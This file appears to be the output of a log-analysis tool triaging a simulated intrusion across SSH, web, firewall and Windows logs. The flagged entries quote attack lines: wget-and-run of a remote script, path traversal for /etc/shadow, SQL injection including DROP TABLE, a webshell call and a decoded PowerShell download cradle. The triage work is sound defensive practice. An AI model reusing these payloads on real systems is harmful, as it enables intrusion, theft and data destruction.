@@ -1,0 +1,75 @@
+
+======================================================================
+1. SSH / AUTH LOG (web01)
+======================================================================
+Failed logins from 203.0.113.45: 42 (first 03:12:05), accounts tried: ['admin', 'deploy', 'git', 'oracle', 'postgres', 'root', 'test', 'ubuntu']
+  -> BRUTE FORCE (>=10 failures)
+Failed logins from 10.0.0.9: 1 (first 02:40:55), accounts tried: ['bob']
+    01:14:09 normal login 'alice' via publickey from 10.0.0.5
+    02:41:07 normal login 'bob' via password from 10.0.0.9
+[!] 03:19:42 SUCCESSFUL login 'deploy' via password from 203.0.113.45 AFTER 42 failures -> probable credential compromise
+    08:02:11 normal login 'alice' via publickey from 10.0.0.5
+Privileged commands:
+   03:20:15 deploy: /usr/bin/id
+   03:21:03 deploy: /usr/bin/wget http://198.51.100.77/x.sh -O /tmp/.x.sh
+   03:21:30 deploy: /bin/bash /tmp/.x.sh
+   03:22:40 deploy: /usr/bin/crontab -l -u root
+Persistence / account changes:
+   Oct 27 03:22:01 web01 useradd[2388]: new user: name=svc_backup, UID=1005, GID=1005, home=/home/svc_backup, shell=/bin/bash
+   Oct 27 03:22:09 web01 usermod[2391]: add 'svc_backup' to group 'sudo'
+   Oct 27 03:23:02 web01 CRON[2402]: pam_unix(cron:session): session opened for user root by (uid=0)
+
+======================================================================
+2. WEB ACCESS LOG (Apache)
+======================================================================
+192.0.2.88  Path traversal: 3 request(s)
+     03:00:21 GET /download.php?file=../../../../etc/passwd -> 200 (1843B)  <-- 200 OK = may have SUCCEEDED
+     03:01:21 GET /download.php?file=../../../etc/shadow -> 403 (199B)
+     03:02:21 GET /download.php?file=....//....//etc/hosts -> 200 (312B)  <-- 200 OK = may have SUCCEEDED
+192.0.2.88  Scanner UA: 5 request(s)
+     03:00:21 GET /download.php?file=../../../../etc/passwd -> 200 (1843B)
+     03:01:21 GET /download.php?file=../../../etc/shadow -> 403 (199B)
+     03:02:21 GET /download.php?file=....//....//etc/hosts -> 200 (312B)
+     03:05:40 POST /upload.php -> 200 (88B)
+     03:06:02 GET /uploads/shell.php?cmd=whoami -> 200 (9B)
+192.0.2.88  Webshell: 1 request(s)
+     03:06:02 GET /uploads/shell.php?cmd=whoami -> 200 (9B)  <-- 200 OK = may have SUCCEEDED
+203.0.113.45  SQL injection: 5 request(s)
+     02:58:10 GET /product.php?id=1' -> 500 (1200B)
+     02:58:11 GET /product.php?id=1' OR '1'='1 -> 500 (1600B)
+     02:58:12 GET /product.php?id=1' UNION SELECT NULL,username,password FROM users-- -> 200 (2000B)  <-- 200 OK = may have SUCCEEDED
+     02:58:13 GET /product.php?id=1; DROP TABLE users-- -> 200 (2400B)  <-- 200 OK = may have SUCCEEDED
+     02:58:14 GET /product.php?id=1' AND SLEEP(5)-- -> 200 (2800B)  <-- 200 OK = may have SUCCEEDED
+203.0.113.45  Scanner UA: 11 request(s)
+     02:50:00 GET /admin/ -> 404 (300B)
+     02:51:01 GET /phpmyadmin/ -> 404 (300B)
+     02:52:02 GET /.git/config -> 404 (300B)
+     02:53:03 GET /backup.zip -> 404 (300B)
+     02:54:04 GET /wp-login.php -> 404 (300B)
+     02:55:05 GET /server-status -> 403 (300B)
+     02:58:10 GET /product.php?id=1' -> 500 (1200B)
+     02:58:11 GET /product.php?id=1' OR '1'='1 -> 500 (1600B)
+     02:58:12 GET /product.php?id=1' UNION SELECT NULL,username,password FROM users-- -> 200 (2000B)
+     02:58:13 GET /product.php?id=1; DROP TABLE users-- -> 200 (2400B)
+     02:58:14 GET /product.php?id=1' AND SLEEP(5)-- -> 200 (2800B)
+
+======================================================================
+3. FIREWALL LOG
+======================================================================
+10.0.1.20 -> 198.51.100.77:80  1 conn(s) 03:21:01..03:21:01
+10.0.1.20 -> 198.51.100.77:4444  12 conn(s) 03:24:11..03:35:11  -> BEACONING every ~60s
+Lateral movement attempts (SMB/445 internal):
+   2026-10-27T03:40:30Z ACCEPT OUT SRC=10.0.1.20 DST=10.0.1.35 PROTO=TCP DPT=445
+   2026-10-27T03:40:31Z DENY OUT SRC=10.0.1.20 DST=10.0.1.36 PROTO=TCP DPT=445
+
+======================================================================
+4. WINDOWS SECURITY EVENTS (WS-014)
+======================================================================
+2026-10-27T08:41:17Z [4688 Process created] jsmith: NewProcess=WINWORD.EXE Parent=explorer.exe CmdLine=WINWORD.EXE "Invoice_Q3.docm"
+2026-10-27T08:41:29Z [4688 Process created] jsmith: NewProcess=powershell.exe Parent=WINWORD.EXE CmdLine=powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC
+   [!] Word spawned PowerShell with hidden window + encoded command
+   DECODED (base64 UTF-16LE): IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.77/a.ps1')
+2026-10-27T08:41:35Z [4688 Process created] jsmith: NewProcess=whoami.exe Parent=powershell.exe CmdLine=whoami /all
+2026-10-27T08:42:10Z [4698 Scheduled task created] jsmith: ScheduledTask=\Updater Action=powershell.exe -w hidden -File C:\Users\jsmith\AppData\Roaming\u.ps1
+4625 failures: 8 x 'Administrator' from 192.0.2.88 (RDP, LogonType 10)
+4625 failures: 1 x 'jsmith' from 192.0.2.88 (RDP, LogonType 10)
